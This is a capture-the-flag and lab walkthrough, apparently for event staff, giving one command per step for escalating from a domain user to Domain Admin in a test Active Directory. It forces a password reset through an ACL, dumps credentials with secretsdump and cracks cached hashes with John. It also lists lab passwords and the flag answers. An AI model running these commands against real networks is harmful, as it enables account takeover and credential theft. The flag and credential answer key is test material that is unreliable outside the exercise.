# Attack path to Domain Admin

Simple one-command-per-step guide. Lab values shown; CTF values in parentheses.

## Lab vs CTF

| Item | Lab (`lab.local`) | CTF (`ctf.local`) |
|------|-------------------|-------------------|
| FOOTHOLD | 10.1.10.30 | 10.X.10.30 |
| HOP | 10.1.10.20 | 10.X.10.20 |
| DC | 10.1.10.10 | 10.X.10.10 |
| Start user | LAB\domainuser / password | CTF\domainuser / CtfStart123! |
| hopadmin (after reset) | HopAdmin!ChangeMe | set in scenario / player choice |
| domainadmin | LAB\domainadmin / password | CTF\domainadmin / CtfDA!ChangeMe |

## Player path (one command each)

```bash
# 0) VPN (staff provides WireGuard config)
sudo wg-quick up ludus

# 1) Foothold — use RDP (not Evil-WinRM) so SharpHound works
xfreerdp /v:10.1.10.30 /u:LAB\\domainuser /p:'password' /cert:ignore /dynamic-resolution

# 2) On FOOTHOLD: double-click Desktop\BloodBash-CTF\Collect-AD.bat
#    Wait for bloodhound.zip on the Desktop, use on-box bloodbash.exe

# 3) BloodBash on FOOTHOLD (preinstalled) (--from-user and --compromise are the SAME flag; use one)
bloodbash.exe %USERPROFILE%\Desktop\bloodhound.zip --from-user domainuser --shortest-paths
bloodbash bloodhound.zip --from-user domainuser --from-user-export

# 4) Force-change hopadmin password (HelpDesk ACL)
bloodyAD --host 10.1.10.10 -d lab.local -u domainuser -p 'password' set password hopadmin 'HopAdmin!ChangeMe'

# 5) Pivot to HOP01 as hopadmin
xfreerdp /v:10.1.10.20 /u:LAB\\hopadmin /p:'HopAdmin!ChangeMe' /cert:ignore /dynamic-resolution

# 6) Dump HOP from Kali (no mimikatz required)
impacket-secretsdump 'LAB/hopadmin:HopAdmin!ChangeMe'@10.1.10.20

# 7) Crack domainadmin DCC2 with John the Ripper (mscash2)
#    Example hash line from secretsdump:
#    LAB.LOCAL/domainadmin:$DCC2$10240#domainadmin#<hash>
echo 'domainadmin:$DCC2$10240#domainadmin#20e91e8410b490e0850c7f0c528db499' > hash.txt
john --format=mscash2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=mscash2 hash.txt --show

# 8) Domain Admin on DC
xfreerdp /v:10.1.10.10 /u:LAB\\domainadmin /p:'password' /cert:ignore /dynamic-resolution
```

## Chain (short)

```text
domainuser (FOOTHOLD)
  → BloodBash: HelpDesk ForceChangePassword hopadmin
  → reset hopadmin
  → hopadmin on HOP01
  → impacket-secretsdump
  → John the Ripper (mscash2) on domainadmin DCC2
  → domainadmin on DC
```

## Notes

- Use RDP for SharpHound. Evil-WinRM network logons break LDAP. Stick with RDP + Collect-AD.bat.
- `--from-user` and `--compromise` are the same. Use one: `bloodbash zip --from-user domainuser`
- `net user ... /domain` for ForceChangePassword often gets denied. Use bloodyAD or rpcclient.
- Dump creds with impacket-secretsdump from your laptop instead of mimikatz on the target.
- Crack with John the Ripper `--format=mscash2`. It works on CPU; hashcat wants GPU.
- For the real event, swap in the CTF IPs and creds but keep the step order.

## Optional alternatives

```bash
# ForceChangePassword via rpcclient
rpcclient -U 'domainuser%password' -W LAB 10.1.10.10 -c "setuserinfo2 hopadmin 23 HopAdmin!ChangeMe"

# John with a tiny wordlist (lab default)
echo password > w.txt
john --format=mscash2 hash.txt --wordlist=w.txt
john --show --format=mscash2 hash.txt
```


## Desktop flags

| Host | Desktop file | Flag |
|------|----------------|------|
| FOOTHOLD | FLAG_start.txt | FLAG{bloodbash_start_foothold} |
| HOP01 | FLAG_hop.txt | FLAG{hopadmin_owns_the_jump} |
| DC01 | FLAG_da.txt | FLAG{domain_admin_via_bloodbash} |

Also under Public Documents on hop/DC as flag_hop.txt / flag_da.txt.
